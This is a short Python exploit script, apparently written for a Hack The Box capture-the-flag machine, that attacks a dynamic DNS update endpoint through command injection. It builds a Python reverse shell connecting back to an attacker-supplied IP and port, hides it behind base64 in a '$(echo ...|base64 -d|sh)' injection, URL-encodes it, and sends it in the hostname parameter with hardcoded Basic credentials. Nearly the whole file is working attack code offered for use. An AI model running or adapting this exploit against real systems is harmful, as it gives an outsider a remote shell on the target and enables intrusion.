import base64
import sys 
from requests.utils import requote_uri
import requests
#check flags: 
remote_ip = sys.argv[1] # takes your ip
remote_port = sys.argv[2] # takes your port, finish by using nc -lvp the chosen port
payload = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" % (remote_ip, remote_port)
print("[+] Sending payload: ", payload)
base64_bytes = base64.urlsafe_b64encode(payload.encode("utf-8")) # encode the revshell payload to b64
base64_final = str(base64_bytes, "utf-8")
print("\n [+] Payload encoded to base64: " % base64_final) # print it for manual 
payload_before_url = "$(echo %s|base64 -d|sh)\"" % base64_final # takes the b64 payload, decodes back and executes
payload_after_url = requote_uri(payload_before_url) #url encode :p
print(payload_after_url)
print("\n[ + ] base64 payload: %s , \n [+] url-encoded payload: %s" % (payload, payload_after_url)) 
## add header: Authorization: Basic X
# Takes the login creds and encodes to base64
auth = "burp:burp" # creds of dns
authen_bytes = base64.urlsafe_b64encode(auth.encode("utf-8"))
authen_final = str(authen_bytes, "utf-8")
print("\n[+] Creds were encoded with b64 and sent as Authorization.....", authen_final)
print("\n\n Established at: %s : %s" % (remote_ip, remote_port))
dest = "http://###.htb/nic/update/?hostname=%schrist.###.htb&myip=127.0.0.1" % payload_after_url # edit later
r = requests.get(dest, headers={'Authorization': 'Basic %s'%(authen_final)})
data = r.content
REMOVED_STRINGS = b"yung.dynamicdns.htb\ngood 10.10.14.25\n" # removes no-ip dns output
new_line = b"server 127.0.0.1\nzone dynamicdns.htb\nupdate delete" # same
remove_words = data.replace(REMOVED_STRINGS,b'') # cuts them
make_newline = remove_words.replace(new_line,b'') # cuts second bytes, final output
print(make_newline) # final output
